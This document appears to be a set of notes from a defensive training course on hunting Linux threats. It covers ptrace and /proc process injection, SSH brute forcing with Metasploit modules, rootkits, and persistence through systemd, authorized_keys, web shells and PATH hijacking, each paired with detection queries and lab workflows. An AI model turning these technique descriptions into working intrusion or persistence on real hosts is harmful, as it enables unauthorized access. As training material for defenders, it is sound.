In 2016, researchers discovered that all distributions of Linux running the Linux kernel from versions 2.6.22 to 4.8.3 were vulnerable to the DirtyCOW exploit. The vulnerability itself was first discovered by the adversaries who had been secretly exploiting it. At the time of the exploit's discovery, every Linux system on the planet was susceptible to attack. Kernel exploit prevalence highlights the need for update monitoring and maintenance. This is because out-of-date legacy systems may still contain vulnerabilities that have a wide breadth of easily actionable exploitation.

------------------------------------------------------------------------

Detecting Process Injection
Process Injection Exploits
﻿

Process injection exploits allow an adversary to hide their malicious code inside a legitimate system process. This technique makes the adversary's malware more difficult to detect and creates a deeper layer of persistence on the exploited system. A common method for hijacking with process injection exploits is by manipulating the variable LD_PRELOAD, which was covered in module 9. This section introduces two other common methods of Linux process injection that involve the system call process trace (ptrace()) and the memory-mapped filesystem /proc.

﻿

ptrace()﻿
﻿

The system call ptrace() [T1055/008] is a very common method for process injection in Linux. The ptrace() tool is normally used to debug or modify another system process. However, ptrace() also allows administrators to perform advanced system functions that directly manipulate how the host handles a given process. If an adversary has access to a user account that can run ptrace() on a system, they can inject code into different process elements. This enables the affected system to execute the adversary's malware inside of the infected process.

﻿

Log monitoring alerts for Linux ptrace() system calls in Security Information and Event Management (SIEM) tools work well to detect possible ptrace() process injection. The specialized nature of ptrace() means that it's very rarely used, therefore any alert indicating ptrace() use is worth investigating. In addition, a process performing abnormal actions can indicate a compromised process. Abnormal actions include opening network connections, reading and writing files, and any other out-of-context behavior.

﻿

/proc﻿
﻿

If an adversary is able to access the filesystem /proc [T1055/009] on a Linux host, they can then enumerate memory mappings and subsequently manipulate the system process stack. Normally, the system's memory mappings are obfuscated by Address Space Layout Randomization (ASLR). However, if the adversary is able to read /proc/[pid]/maps in the filesystem, they can find out exactly where those processes are being stored in RAM. With the memory addresses, the adversary can then overwrite the process data with their own malicious code so that the system executes the malicious code when it references those memory objects.

﻿

To detect potential /proc exploitation, analysts should monitor any changes to /proc files. Any user-related file changes are cause for concern since, in nearly all cases, users should not have the permissions to modify files in this directory.

﻿

SSH Exploits
﻿

In Linux, SSH logins are the most common method for interactive remote user sessions between systems. Adversaries often attempt to gain access to Linux systems over an SSH connection through password brute-forcing or SSH key spraying.

﻿

Metasploit, the penetration testing framework, contains a wide variety of pre-made modules for testing exploits on different systems. The tool’s module ssh_login allows for password brute forcing for known and default accounts. The module simply needs a list of usernames and passwords to attempt, before providing a report on any login combinations that succeed. The module ssh_login_pubkey requires a ssh private key to be obtained from a compromised host. The module then sprays that key across the network to identify which systems accept the compromised keys for login. Even though Metasploit modules are intended to be used for testing purposes, many adversaries use these modules to identify vulnerable systems to attack. 

﻿

Password brute-forcing and SSH key spraying are detected by monitoring port 22 activity using network flow logs and monitoring failed SSH login attempts in host authentication logs. In Debian-based systems, the relevant logs are located in /var/log/auth.log. In systems based in Red Hat Enterprise Linux (RHEL), these logs are located in /var/log/secure. An indicator of brute force activity is a large number of failed logins or a user account attempting to log in to many computers simultaneously.


----------------------------------------------------------

Detecting Rootkits
Linux Rootkits
﻿

After compromising a system, many adversaries install a rootkit [T1014] on a target to gain stealth persistence on the affected host. Rootkits are malware that hijack the Linux kernel and allow adversaries full control over how the OS behaves. Adversaries exploit a target with either a user mode rootkit or a kernel mode rootkit [T1547/006].

﻿

User Mode Rootkits
﻿

Many user mode rootkits found today are derived from other common rootkits such as LD_PRELOAD or the JynxKit, which is also based on LD_PRELOAD. These rootkits are designed to function like installed malware. They modify login shells like sshd to maintain a persistent backdoor to a target machine. User mode rootkits can also modify su or sudo to allow easy privilege escalation. These rootkits also modify logging (syslogd), processes (ps, pidof, top), files (ls, find), and many other OS functions to hide the adversary's presence on a host. There are thousands of user mode Linux rootkits. However, the similarity at the core of all Linux rootkits is that they all modify Linux user components in some way to manage the same end of taking control of a system and hiding the rootkit's presence.

﻿

To detect user mode rootkits, analysts can use packet sniffers from outside the suspected host. The packet sniffers can help analysts identify abnormal traffic that may indicate the presence of rootkits. Another option for identifying an installed rootkit is to isolate the affected system and scan the host with another tool. The tools Chkrootkit and Rootkit Hunter (rkhunter) scan local systems and identify malware that attempts to mask its existence on a host. The tool Linux Malware Detect (LMD) cross-references known threat data to identify and remove malware.

﻿

Kernel Mode Rootkits
﻿

In most Linux distributions, kernel mode Rootkits manipulate the Linux Kernel Modules (LKM) in /lib/modules or /usr/lib/modules. These LKMs are loaded when the host boots to build and run the OS. The most common kernel modules found in /usr/lib/modules contain hardware device drivers and other user-added modules. Rootkits allow adversaries to keep their control over the target system. Kernel mode rootkits operate at the kernel level in an operating system, often altering applications at this level. This technique obfuscates the rootkit from standard methods of detection.

﻿

After compromising a target system, adversaries can achieve any of following activities:

Modify login services such as sshd to maintain persistence.

Modify su or sudo to elevate privileges.

Alter processes and system events to obfuscate detection.

Execute code within other legitimate system processes trusted throughout the network for lateral movement.

Possible indicators of compromise include any changes to folders that are not authorized by a systems administrator, such as /lib/modules, /usr/lib/modules, lsmod, and /proc/modules. However, if an adversary has installed a rootkit on a host, they can delete syslogs, manipulate command histories, and even interrupt the Linux kernel to ignore its primary security functions and permissions. Because of this, rootkits can be difficult to detect once they've been installed, so an infected system cannot be trusted.

﻿

While scanning tools can sometimes detect kernel rootkits, this type of malware usually requires memory analysis or diff-based system comparison with known good images. Upcoming modules provide more information on these in-depth methods of detection. Removing these rootkits often involves completely reimaging a host and restoring the fresh image with recovered data that can be verified as non-compromised if file hash validation is available.

﻿----------------------------------------------------------------

 Hunt for Rootkits on a Linux Host
Read the following scenario. Then, use the information from this lesson to complete the workflow.

﻿

Scenario
﻿

The network team notices a Virtual Machine (VM) communicating with external IP addresses. After sniffing packet data, the team determines that important information was being exfiltrated from the Virtual Machine (VM) lin-hunt-cent. The team isolates the system from the network, clones the VM, and begins to investigate how the host was exploited.

﻿

Scan for Rootkits on an Exploited Linux Host
﻿

Use the terminal to investigate files and determine if the host was exploited.

﻿

Workflow
﻿

1. Log in to the VM lin-hunt-cent using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a new terminal session.

﻿

3. Run Rootkit Hunter to search the filesystem for any potential rootkits using the following case-sensitive command:

# sudo /home/trainee/Downloads/rkhunter-1.4.6/files/rkhunter -c -sk
﻿

4. Display the log file at /var/log/rkhunter.log with the following command, to examine a rootkit detection report:

# sudo less /var/log/rkhunter.log


![image](https://github.com/user-attachments/assets/23a1b959-ac41-4b03-940e-40fe4d2cca12)



5. Search for running processes using the command less and the following command:
/running_procs



6. Enter q to quit the command less.


Some rootkits are tagged based on their activity, while other tags are based on file contents. The logs display the processes and files that are suspicious and should be examined. Use the information from this lab to answer the next question. 


------------------------------------------------
Types of Rootkits Scanned
The scanner tool identified /lib64/libkeyutils.so.1.9 and its symbolic link /usr/lib64/libkeyutils.so.1.9 as potential rootkits. In a real-world scenario, these may be false positives, but they are worth investigating as they could mean wider exploitation throughout the network.

-----------------------------------------------------

########## M5 L3 ############
############# Persistence Mechanisms on Linux ############

Linux Persistence Overview
A threat actor gains persistence on a Linux system by creating a backdoor, in case access to the target system is lost. Completely ridding a system of a threat actor is therefore difficult for defenders since the adversaries are able to continue gaining access through their persistence methods. If defenders are not aware of persistence TTPs on Linux, they will only be able to remove a portion of the threat actor toolkit, leaving the system vulnerable for the next inevitable attack.

﻿

Adversaries have many methods of establishing persistence from which to choose. Detecting each method requires proper logging. A simple way to gather the required logging is to deploy Elastic’s Auditbeat configured with the auditd, system, and file integrity modules while employing a best practice auditd rule set. Florian Roth offers one such rule set on GitHub, which is provided in the additional resource section of this task. 

﻿

Understanding the basic and advanced methods of Linux persistence and how to detect them allows defenders to more decisively expel adversaries from a system the first time, by ensuring that no backdoors exist. This detection becomes more difficult when threat actors deploy kernel rootkits using a persistence method because kernel rootkits are able to intercept system calls. Additional details about working with this type of TTP is explained in an upcoming module.
------------------------------------------------------------------

Common Linux Persistence Methods
There are many different methods of obtaining persistence on a Linux system. Defenders who continuously learn new methods of persistence are better prepared to ensure the detections in place are effective for catching adversaries. This section introduces four advanced methods that fall under the following MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) techniques:

T1543.002 Systemd Service

T1037.004 Run Control (RC) Scripts

T1098 Secure Shell (SSH) Authorized Keys

T1505.003 Web Shell

T1574.008 Path Interception by Search Order Hijacking


Systemd Service and RC Scripts
﻿

Adversaries may obtain persistence by creating or modifying a service to execute a malicious payload. Every service has a service unit file that controls how and when the service is run. These files are located in the directories /etc/systemd/system and /usr/lib/systemd/system and have an extension of .service. Modifying a service unit file in the aforementioned location requires root privileges by default. This prevents a low privilege user from modifying those service unit files. However, user-level persistence is still possible by modifying or creating service unit files located in the directory ~/.config/systemd/user.

﻿

To detect the systemd services used for persistence, defenders should monitor for usage of the commands systemctl and service. Defenders should also monitor for new or modified files in the following directories:

/etc/systemd/system

/usr/lib/systemd/system/

~/.config/systemd/user/

Before systemd existed, init was the standard daemon used to initialize, manage, and track services and daemons. Threat actors still use init to maintain persistence using RC scripts. RC scripts are executed during system startup to launch custom services. Threat actors can modify the RC scripts to contain paths to malicious binaries and shell commands. Detecting this activity requires monitoring and auditing the file /etc/rc.local for unapproved changes.

﻿

Determining potential malicious activity is much easier when defenders have a baseline of approved services. Another way to identify a potentially malicious service is by researching the name of the service. If information about the service is unavailable online, this should raise suspicions. If the name of an enabled service does not look familiar, investigating the surrounding traffic can provide additional context for determining whether or not the service is legitimate. For example, in an investigation of an unrecognized service, an analyst may find suspicious network traffic occurring right after the service was enabled. That traffic may reveal an attempted callback for a reverse shell or similar unexpected activity.

﻿

SSH Authorized Keys
﻿

The SSH file /home/<user>/.ssh/authorized_keys defines the keys that are authorized for use during key-based authentication. Threat actors abuse this feature to gain persistence on a host by creating their own SSH key and adding the public key to the file authorized_keys.

﻿

File integrity logging is useful for detecting this type of activity because changes to the file authorized_keys are uncommon. Defenders can monitor for changes to this file to receive alerts that should prompt further investigation.

﻿

Another file that should be monitored is /etc/ssh/sshd_config. A threat actor may add their public key to authorized_keys and find that the file sshd_config does not allow for public key authentication. In this case, the threat actor must edit the configuration file sshd_config and change the values for the fields PubkeyAuthentication and RSAAuthentication to yes.

﻿

Web Shell
﻿

One type of backdoor on a Linux web server is a web shell. A web shell is a script that allows threat actors to use the web server as a gateway into a network. Analysts can audit changes to public folders to catch any malicious web scripts being added. These folders include /var/www/html and any other directory hosting internet-facing files. Another option is to monitor for web servers accessing files that are not in the web directory or files that are spawning processes that a web server should not need to spawn.

﻿

Path Interception by Search Order Hijacking (Binary Wrapping)
﻿

A threat actor can hijack the use of common system commands on Linux to create a stealthy backdoor. For example, adding a binary named hostname to the directory /usr/local/bin/ hijacks the use of /bin/hostname. This is because the user-specific bin directory has priority over the system-wide bin directory when running a command without the absolute path. The threat actor can add anything they want to the directory /usr/local/bin/hostname, make it executable, and then use that binary in a scheduled task to inconspicuously launch their backdoor. A defender can check the search order by running the command echo $PATH to list the current $PATH configuration. The search order priority is presented left to right. A threat actor can modify the $PATH to change the search order in preparation for a persistence method they plan on using. Organizations should always use absolute paths in system administration scripts to avoid search order hijacking.

﻿

Analysts may need to monitor various types of activities to effectively detect when file permissions are being modified. Auditing the usage of the command chmod may help analysts identify suspicious files in user-specific bin locations that threat actors are making executable. However, a threat actor may not need chmod if they change the command umask to 000 and then create a file because this makes the file globally executable. Analysts should be suspicious if they see a normal system command that is located by default in /bin or if the command is added to /usr/local/bin and made an executable. Additionally, monitoring surrounding network traffic after the execution of a suspicious binary often leads to the detection of suspicious network traffic.

﻿

﻿

Detection Recommendations
﻿

Table 5.3-1, below, provides a quick reference of the items to monitor to detect each of the common persistence TTPs described above. These items comprise a mix of directories and files (paths), commands, and activities.


![image](https://github.com/user-attachments/assets/dbf78fa5-adad-4ed8-9c17-c36171036117)

--------------------------------------------------------------------------------------------

Indications of Linux Persistence
All four of the common Linux persistence methods were used in the large dataset from the previous workflow. These methods include the following:

Systemd service

SSH authorized_keys

Web shell

Binary wrapping

Systemd Service
﻿

Description
﻿

A malicious service was created called ntsh.service. It was started, enabled, and daemon-reload was run.

﻿

Query
﻿

Running the following query and then creating a table visualization to review all the process.title values reveals the suspicious process:

process.title: (*systemctl* OR *service*)
﻿

SSH Authorized Keys
﻿

Description
﻿

The root user modified /home/JCTE/.ssh/authorized_keys and /etc/ssh/sshd_config.

﻿

Query
﻿

Running the following query reveals this activity:

event.module: file_integrity AND file.path: (*.ssh/authorized_keys* OR */etc/ssh/sshd_config*)
﻿

Web Shell
﻿

Description
﻿

A suspicious php script named bdoor.php was created in /var/www/html.

﻿

Query
﻿

Running the following query reveals this activity:

process.title: */var/www/html* OR file.path: */var/www/html*
﻿

Binary Wrapping
﻿

Description
﻿

A suspicious binary named date was created in /usr/local/bin. The binary date is a standard system binary that is located in /bin by default.

﻿

Query
﻿

Running the following query reveals this activity:

process.title: */usr/local/bin* OR file.path: */usr/local/bin*

-----------------------------------------------------------------

########## M5 L4 ############
############# Responding to a Linux Incident ############

MITRE D3FEND
MITRE D3FEND Overview
﻿

MITRE developed D3FEND as a repository of defensive cybersecurity techniques designed to counteract offensive techniques by adversaries. Understanding D3FEND is an asset for any party involved in security systems architecture because it is an effective resource for helping to keep networks as secure as possible. 

﻿

D3FEND consists of five stages. Table 5.4-1, below, presents the critical goal and common defense techniques employed at each stage.

![image](https://github.com/user-attachments/assets/1ca3f0ac-df5f-4dff-bbf8-900ec8a5319e)

MITRE D3FEND and Incident Response


Incident response techniques and strategies are found in the isolate, deceive, and evict stages. Once an incident has been detected, it is the role of an incident response team to isolate the activity to a portion of the network, lure the activity to an intended location or object, and then evict the activity from the network. 

------------------------------------------------------------------------

Incident Response
Incident Response Overview
﻿

Incident response is a primary component of the defense of any network. The National Institute of Standard and Technology (NIST) defines incident response as “the mitigation of violations of security policies and recommended practices.” However, this mitigation does not start solely after an incident occurs. Incident response is an ongoing process, so it is a best practice for analysts and teams to be ready at all times. To conduct effective IR mitigation, defenders require the most recent applicable techniques and threat intelligence to prepare for and respond to adversaries. Below are the tasks surrounding the preparation and response activities that apply to all types of IR. 

﻿

Preparation 
﻿

IR preparation includes methods and strategies for arranging response techniques to an incident. Efficient preparation leads to efficient IR. Common preparation strategies include the following:

Synchronize time across the network
Manage logs
Establish Baseline
Synchronize Time Across the Network﻿

﻿

A network may include portions, devices, and hosts physically located in different locations. In the preparation stage, it is critical to synchronize time across the network so that defenders can make sense of event data such as the time and sequence of events. 

﻿

Manage Logs﻿

﻿

A Security Information Event Management (SIEM) tool that analyzes log entries and activity enables defenders to address incidents effectively and appropriately. In preparation for IR, logs that require further analysis should be generated, saved, and sent to the appropriate SIEM to refer back to, as needed.

﻿

Establish Baseline﻿

﻿

Baselining refers to documenting, saving, and analyzing any hardware, software, databases, and relevant documentation for a system, at a given point in time. Any components on the network that are suspected to be affected by an incident require a baseline. Any data and applicable resources should then be duplicated and kept as a backup. 

﻿

Response 
﻿

The response part of IR includes the methods and strategies used to address and mitigate an incident. When responding to an incident, Cyber Protection Teams (CPTs) must complete the following steps:

Analyze the scope
Build a timeline
Confirm the incident
Isolate affected hosts
Deceive and evict adversary activity 
Analyze memory
Step 1: Analyze the Scope﻿

﻿

One component in responding to an incident is to understand the scope. An incident can be triggered with only a small portion of intelligence, however, the scope starts growing as response activities get underway. Defenders may need to triage the incident remotely to prevent the scope of the incident from growing. Endpoint tools are helpful for remote triage. An endpoint tool such as Beats collects and sends data to the Elastic Stack for analysts to view and assess remotely. The remote access to host data enables an effective assessment and effective means of response while also reducing the time to respond.

﻿

Step 2: Build a Timeline﻿

﻿

A timeline helps to understand the time and duration of relevant actions. Construction of a timeline may provide analysts a clear picture of the sequence of events leading to the incident. There are several documents to examine to build a timeline, as covered in the Cyber Defense Analyst - Basic (CDAB) course. Examining external reporting and observing the Operation Notes (OPNOTE) of other analysts are critical tasks at this stage. Building a timeline of the incident involves the following key documents:

Situational Reports (SITREP): Routinely generated to provide updates to higher elements on a daily, weekly, per-phase, or on request.
Tactical Assessments: Low-level assessments that often contain their own Measures of Effectiveness (MOE) and Measures of Performance (MOP).
OPNOTEs: In-depth and technical information about the events that occur during mission execution, containing very specific timestamps and events. When more detail than a high-level summary is needed, consult the OPNOTEs.
OPNOTEs are helpful in developing an execution timeline that includes reports on health and status as well as cyber IR. 

﻿

Many US government agencies publish health and status reports on a regular basis to aid with situational awareness of current operational activities. This enables the capacity to build, defend, and operate in cyberspace. These reports have a variety of functions, but they are especially useful in establishing past trends and assessing their impact on the mission partner’s network.

﻿

Additionally, DoD agencies must abide by the cyber incident handling program defined in the Chairman of the Joint Chiefs of Staff Manual (CJCSM) 6510.01B. This document outlines a specific incident response report template. The completed reports are stored in the Joint Incident Management System (JIMS) on Secret Internet Protocol Router Network (SIPRNet). Past incidents provide a historic picture of the network, as well.

﻿

Step 3: Confirm the Incident﻿

﻿

In the third step, defenders confirm the incident prior to employing any techniques aimed at addressing the incident, to ensure their plans are valid. In this stage, any reported Indicators of Compromise (IOC) and Tactics, Techniques, and Procedures (TTP) are leveraged to check and validate the incident occurred on the network. Confirming the incident may include tasks such as checking for unusual processes, altered system files, hidden files or processes, and modified log entries. 

﻿

Step 4: Isolate Affected Hosts﻿

﻿

Isolating affected hosts is the temporary removal of the hosts from the network. An affected host may contain components designed to impact other portions, devices, or hosts on the network. If a host is affected by an incident it must be isolated in an effort to contain the incident. 

﻿

Step 5: Deceive and Evict Adversary Activity 

﻿

Deceiving and evicting adversary activity involves luring the adversary to an intended location of the network and removing them from the network. Options for luring adversaries include developing honeypots or decoy files and controlled areas containing information that would be useful to the adversary. When the adversary interacts with the decoy, strategies such as account locking and process termination are implemented to evict the adversary from the network.

﻿

Step 6: Analyze Memory

﻿

Memory analysis involves strategies to capture and analyze the components that comprise the memory of affected hosts. Strategies in memory analysis include dumping memory from the affected hosts. Once the memory is dumped, it can be reassembled in a safe environment for further analysis. Saving the memory from the incident can aid in the defense measures to prevent similar incidents from reoccurring on the network. 

﻿-------------------------------------------------------------------

 Responding to a Linux Incident
Read the following scenario. Then, use the skills and information from this and previous lessons to complete the workflow and answer the following series of questions.

﻿

Scenario 
﻿

A Cyber Protection Team (CPT) has been assigned a mission within the Virtual City (vCity) Powerplant network. The primary object of the mission is to execute analysis of the compromised Linux host, uws. The host uws provides support to the subnet Services within the Powerplant network. Recently, the host uws experienced suspicious activity with unusual processes and services running. To investigate uws, start by searching for any outlier or suspicious processes running. 

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) uws using the following credentials:

﻿

Username: trainee
Password: CyberTraining1! 
﻿

2. Open Terminal.

﻿

3. Review the processes that have run on the host. 

--------------------------------------------------------------

Processes
The command ps -ef returns processes executed, sorted sequentially. 

﻿

Review the output of the command ps -ef.

------------------------------------------------------------------

Services Running
The command systemctl list-units --type=service returns services found on the host. Upon review of the services, nothing is inherited. The output does not find the association between services and process. Additional commands are needed to identify processes and their associated services.

-------------------------------------------------------------

Processes and Services
The command systemctl status | less returns processes and associated services found on the host. Query the output to discover which service is associated with the Netcat process /nc. 

------------------------------------------------------------------

Suspicious Service
The service netlibconf.service is associated with the Netcat process found on the host. 

the previous command let us look through and find the answer
![image](https://github.com/user-attachments/assets/3d70bca3-011f-4ed3-930f-552942ec4452)

-------------------------------------------------------------------

Suspicious Service Details
Figure 5.4-1, below, displays the output of the command systemctl status netlibconf. This command provides details associated with the service, such as the directory. 

![image](https://github.com/user-attachments/assets/9758016c-b686-49da-ae82-c308ec2c2a01)

-------------------------------------------------------------

User Privileges
The command ls -la /lib/systemd/system/netlibconf.service provides the user and their permissions associated with the service. The output from the command is below:

﻿

-rw-r--r– 1 bob bob 140 Apr 21 13:09 /lib/systemd/system/netlibconf.service
﻿

This output indicates that the user bob had read and write privileges and accessed the configuration file /lib/systemd/system/netlibconf.service on April 21 at 13:09. The user bob was the only user to access the service.

﻿

Additional investigation may be necessary to definitively confirm that the file was modified by the user bob.

---------------------------------------------------------------

Confirming the Incident
The command ls -ld usr/lib/systemd/system/ provides output that indicates the directory is world-writable. A world-writable directory allows any user with access to the host to write to the directory. In the incident that occurred, the user bob gained access to the host uws. Once in the host, bob created a service (netlibconf.service) and ran the process Netcat out of the service. The activity bob implemented on uws was directed with the goal of maintaining persistence on the host. 

-----------------------------------------------------------------


































 
